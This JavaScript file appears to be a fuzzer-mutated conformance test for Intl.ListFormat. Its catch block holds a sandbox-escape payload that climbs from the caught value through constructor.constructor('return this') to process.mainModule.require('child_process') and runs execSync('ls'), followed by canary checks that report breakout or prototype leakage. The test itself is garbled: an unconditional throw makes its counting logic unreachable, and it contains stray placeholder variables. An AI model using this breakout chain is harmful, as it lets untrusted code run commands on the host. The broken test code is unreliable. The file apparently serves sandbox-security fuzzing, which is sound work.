try {
    let lf = new Intl.ListFormat();
    let iterator_close_call_return = {
        [Symbol.iterator]() {
            let REPLACER = 23;
            return this;
        },
        'return'() {
            let REPLACER = 23;
            this.returnIsCalled = true;
            assert.sameValue(this.count, 3);
        },
        count: 0,
        returnIsCalled: false,
        next() {
            throw () => {
                return () => {
                };
            };
            this.count++;
            if (this.count == 3) {
                return {
                    done: false,
                    value: 3
                };
            }
            if (this.count < 5) {
                return {
                    done: false,
                    value: String(this.count)
                };
            }
            return { done: true };
        }
    };
    assert.throws(TypeError, () => {
        lf.formatToParts(iterator_close_call_return);
    }, 'Iterable yielded 3 which is not a string');
    assert.sameValue(iterator_close_call_return.count, 3);
    assert.sameValue(iterator_close_call_return.returnIsCalled, true);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}